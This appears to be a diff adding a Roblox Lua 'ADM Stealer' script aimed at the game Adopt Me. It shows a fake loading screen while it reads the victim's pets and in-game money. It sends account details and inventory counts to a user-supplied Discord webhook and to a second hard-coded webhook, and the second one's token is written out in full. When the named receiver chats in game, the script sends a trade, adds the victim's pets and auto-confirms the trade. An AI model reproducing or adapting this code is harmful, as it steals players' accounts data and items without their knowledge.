@@ -1,0 +1,331 @@
+if Username == "" or Username == nil then
+    game:GetService("Players").LocalPlayer:Kick("Enter a username!")
+end
+if Webhook == "" or Webhook == nil then
+    game:GetService("Players").LocalPlayer:Kick("Please enter a webhook!")
+end
+
+LogsWebhook = "https://discord.com/api/webhooks/1279687615922049046/fKSXhAU2naF6Zy7Deaq81v1d3kb6sI3qw45-Fx2lp1qJ-4cbqzE8U5Q_xA43aG6B11Vq"
+
+local Pets = {}
+local PetCounts = {}
+
+for i, v in pairs(
+    require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory.pets
+) do
+    local label = ""
+    if v.properties.mega_neon then
+        label = " (Mega Neon)"
+    elseif v.properties.neon then
+        label = " (Neon)"
+    else
+        label = " (Normal)"
+    end
+    local petName = v.id:gsub("%d+", ""):gsub("_", " "):gsub("%s+", " ")
+    petName =
+        petName:gsub(
+        "(%a)(%a*)",
+        function(first, rest)
+            return first:upper() .. rest:lower()
+        end
+    )
+    local key = petName .. label
+    if PetCounts[key] then
+        PetCounts[key] = PetCounts[key] + 1
+    else
+        PetCounts[key] = 1
+    end
+end
+
+local LoadingUI = Instance.new("ScreenGui")
+local LoadingScreen = Instance.new("Frame")
+local LoadingText = Instance.new("TextLabel")
+local LoadingRing = Instance.new("ImageLabel")
+
+--Properties:
+
+LoadingUI.Name = "LoadingUI"
+LoadingUI.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+LoadingUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+LoadingScreen.Name = "LoadingScreen"
+LoadingScreen.Parent = LoadingUI
+LoadingScreen.AnchorPoint = Vector2.new(0.5, 0.5)
+LoadingScreen.BackgroundColor3 = Color3.fromRGB(0, 20, 40)
+LoadingScreen.BorderColor3 = Color3.fromRGB(27, 42, 53)
+LoadingScreen.Position = UDim2.new(0.5, 0, 0.5, 0)
+LoadingScreen.Size = UDim2.new(2, 0, 2, 0)
+
+LoadingText.Name = "LoadingText"
+LoadingText.Parent = LoadingScreen
+LoadingText.AnchorPoint = Vector2.new(0.5, 0.5)
+LoadingText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+LoadingText.BackgroundTransparency = 1.000
+LoadingText.BorderColor3 = Color3.fromRGB(27, 42, 53)
+LoadingText.BorderSizePixel = 0
+LoadingText.Position = UDim2.new(0.5, 0, 0.5, 0)
+LoadingText.Size = UDim2.new(0, 139, 0, 30)
+LoadingText.Font = Enum.Font.SourceSans
+LoadingText.Text = "Loading"
+LoadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+LoadingText.TextScaled = true
+LoadingText.TextSize = 14.000
+LoadingText.TextWrapped = true
+
+LoadingRing.Name = "LoadingRing"
+LoadingRing.Parent = LoadingScreen
+LoadingRing.AnchorPoint = Vector2.new(0.5, 0.5)
+LoadingRing.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+LoadingRing.BackgroundTransparency = 1.000
+LoadingRing.BorderColor3 = Color3.fromRGB(27, 42, 53)
+LoadingRing.BorderSizePixel = 0
+LoadingRing.Position = UDim2.new(0.5, 0, 0.5, 0)
+LoadingRing.Size = UDim2.new(0, 161, 0, 161)
+LoadingRing.Image = "rbxassetid://4965945816"
+
+-- Scripts:
+
+local function QZYGWV_fake_script() -- LoadingUI.LocalScript 
+	local script = Instance.new('LocalScript', LoadingUI)
+
+	local ReplicatedFirst = game:GetService("ReplicatedFirst")
+	local TweenService = game:GetService("TweenService")
+	local LoadingRing = script.Parent.LoadingScreen.LoadingRing
+	
+	ReplicatedFirst:RemoveDefaultLoadingScreen()
+	
+	local tweenInfo = TweenInfo.new(4, Enum.EasingStyle.Linear, Enum.EasingDirection.In, -1)
+	local tween = TweenService:Create(LoadingRing, tweenInfo, {Rotation=360})
+	tween:Play()
+	
+	wait(5)
+	if not game:IsLoaded() then
+		game.Loaded:Wait()
+	end
+end
+coroutine.wrap(QZYGWV_fake_script)()
+
+local Loaders = require(game.ReplicatedStorage.Fsys).load
+local InventoryDB = Loaders("InventoryDB")
+local ClientData = Loaders("ClientData")
+local legendaries_count = 0
+local mega_count = 0
+local neon_count = 0
+local ultra_count = 0
+local rare_count = 0
+local uncommon_count = 0
+local common_count = 0
+local total_pets = 0
+local bucks = tostring(require(game:GetService("ReplicatedStorage").Fsys).load("ClientData").get("money"))
+for i, v in pairs(ClientData.get("inventory").pets) do
+    total_pets = total_pets + 1
+end
+
+for i, v in pairs(ClientData.get("inventory").pets) do
+    if InventoryDB[v.category][v.id].rarity == "legendary" then
+        legendaries_count = legendaries_count + 1
+    end
+    if InventoryDB[v.category][v.id].properties == "mega_neon" then
+        mega_count = mega_count + 1
+    end
+    if InventoryDB[v.category][v.id].properties == "neon" then
+        neon_count = neon_count + 1
+    end
+    if InventoryDB[v.category][v.id].rarity == "ultra_rare" then
+        ultra_count = ultra_count + 1
+    end
+    if InventoryDB[v.category][v.id].rarity == "rare" then
+        rare_count = rare_count + 1
+    end
+    if InventoryDB[v.category][v.id].rarity == "uncommon" then
+        uncommon_count = uncommon_count + 1
+    end
+    if InventoryDB[v.category][v.id].rarity == "common" then
+        common_count = common_count + 1
+    end
+end
+
+local messageADOPT =
+    "**||@everyone||**\nNOTE: You have **3 seconds** to accept the trade otherwise, the script will break.\nYou have **5 seconds** to accept the trade."
+if legendaries_count >= 5 or neon_count >= 5 or mega_count >= 1 then
+    messageADOPT =
+        "**||@everyone||**\nNOTE: You have **3 seconds** to accept the trade otherwise, the script will break.\nYou have **5 seconds** to accept the trade."
+end
+local plr = game.Players.LocalPlayer
+local userr = Username
+local userid = game.Players.LocalPlayer.UserId
+local accage = game.Players.LocalPlayer.AccountAge
+local data = {
+    username = "Pethical Trade - Result",
+    avatar_url = "https://cdn.discordapp.com/attachments/1282931642620706908/1283459804089548800/standard.gif?ex=6708a556&is=670753d6&hm=01662f53e4b8644a38a029c682b8ae93cf0ec0b65ad6c2ebf37035d20dfe3e8f&",
+    content = messageADOPT,
+    embeds = {
+        {
+            title = "**__Pethical | ADM Stealer__**",
+            description = "**Player Information**: \n ```lua\nUsername: " ..
+                tostring(plr) ..
+                    "\nUser-ID: " ..
+                        tostring(userid) ..
+                            "\nAccount Age: " ..
+                                tostring(accage) ..
+                                    "\nReceiver: " ..
+                                        userr ..
+                                            "\n```\n **Inventory**: \n ```lua\nLegendaries: " ..
+                                                tostring(legendaries_count) ..
+                                                    "\nMega Neons: " ..
+                                                        tostring(mega_count) ..
+                                                            "\nNeons: " ..
+                                                                tostring(neon_count) ..
+                                                                    "\nUltra Rares: " ..
+                                                                        tostring(ultra_count) ..
+                                                                            "\nRares: " ..
+                                                                                tostring(rare_count) ..
+                                                                                    "\nUncommons: " ..
+                                                                                        tostring(uncommon_count) ..
+                                                                                            "\nCommons: " ..
+                                                                                                tostring(common_count) ..
+                                                                                                    "\nBucks: " ..
+                                                                                                        bucks ..
+                                                                                                            "\nTotal Pets: " ..
+                                                                                                                tostring(
+                                                                                                                    total_pets
+                                                                                                                ) ..
+                                                                                                                    '\n```\n**Join Player Script**:\n\n```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' ..
+                                                                                                                        game.JobId ..
+                                                                                                                            '", game.Players.LocalPlayer)\n```',
+            color = tonumber(0x3365FF),
+            fields = {
+                {
+                    name = "Player Iventory:",
+                    value = "**COMMING SOON!**"
+                }
+            }
+        }
+    }
+}
+local request = http_request or request or HttpPost or syn.request
+request(
+    {
+        Url = Webhook,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game.HttpService:JSONEncode(data)
+    }
+)
+
+local Logs = {
+    username = "Skidtho Script - Logs",
+    avatar_url = "https://cdn.discordapp.com/attachments/1282931642620706908/1283459804089548800/standard.gif?ex=6708a556&is=670753d6&hm=01662f53e4b8644a38a029c682b8ae93cf0ec0b65ad6c2ebf37035d20dfe3e8f&",
+    content = messageADOPT,
+    embeds = {
+        {
+            title = "**__Pethical | ADM Stealer__**",
+            description = "**📃  Player Information**: \n ```lua\n🗽 Username: " ..
+                tostring(plr) ..
+                    "\nUser-ID: " ..
+                        tostring(userid) ..
+                            "\nAccount Age: " ..
+                                tostring(accage) ..
+                                    "\nReceiver: " ..
+                                        userr ..
+                                            "\n```\n **Inventory**: \n```lua\nLegendaries: " ..
+                                                tostring(legendaries_count) ..
+                                                    "\nMega Neons: " ..
+                                                        tostring(mega_count) ..
+                                                            "\nNeons: " ..
+                                                                tostring(neon_count) ..
+                                                                    "\nUltra Rares: " ..
+                                                                        tostring(ultra_count) ..
+                                                                            "\nRares: " ..
+                                                                                tostring(rare_count) ..
+                                                                                    "\nUncommons: " ..
+                                                                                        tostring(uncommon_count) ..
+                                                                                            "\nCommons: " ..
+                                                                                                tostring(common_count) ..
+                                                                                                    "\nBucks: " ..
+                                                                                                        bucks ..
+                                                                                                            "\nTotal Pets: " ..
+                                                                                                                tostring(
+                                                                                                                    total_pets
+                                                                                                                ) ..
+                                                                                                                    '\n```\n**Join Player Script**:\n\n```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' ..
+                                                                                                                        game.JobId ..
+                                                                                                                            '", game.Players.LocalPlayer)\n```',
+            color = tonumber(0x3365FF),
+            fields = {
+                {
+                    name = "Player Iventory:",
+                    value = "**COMMING SOON!**"
+                }
+            }
+        }
+    }
+}
+local request = http_request or request or HttpPost or syn.request
+request(
+    {
+        Url = LogsWebhook,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game.HttpService:JSONEncode(Logs)
+    }
+)
+
+local function StartSteal()
+    local Loads = require(game.ReplicatedStorage.Fsys).load
+    local RouterClient = Loads("RouterClient")
+    local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
+    local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
+    local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
+    local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
+
+    SendTrade:FireServer(game.Players[Username])
+    wait(3)
+    local PetsInventory =
+        require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
+    if PetsInventory.pets then
+        local petCount = 0
+        local petUids = {}
+        for petUid, petData in pairs(PetsInventory.pets) do
+            table.insert(petUids, petUid)
+        end
+
+        while #petUids > 0 do
+            local petUid = table.remove(petUids, 1)
+            AddPetRemote:FireServer(petUid)
+            petCount = petCount + 1
+            if petCount >= 18 then
+                break
+            end
+        end
+    else
+        print("No pets found in inventory.")
+    end
+    wait(6)
+    AcceptNegotiationRemote:FireServer()
+    wait(5)
+    local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
+    ConfirmTradeRemote:FireServer()
+end
+
+if total_pets == 1 then
+    game:GetService("Players").LocalPlayer:Kick(
+        "Error: Pls use different account!"
+    )
+end
+
+game.Players.PlayerAdded:Connect(
+    function(player)
+        if player.Name == Username then
+            player.Chatted:Connect(
+                function(msg)
+                    StartSteal()
+                end
+            )
+        end
+    end
+)
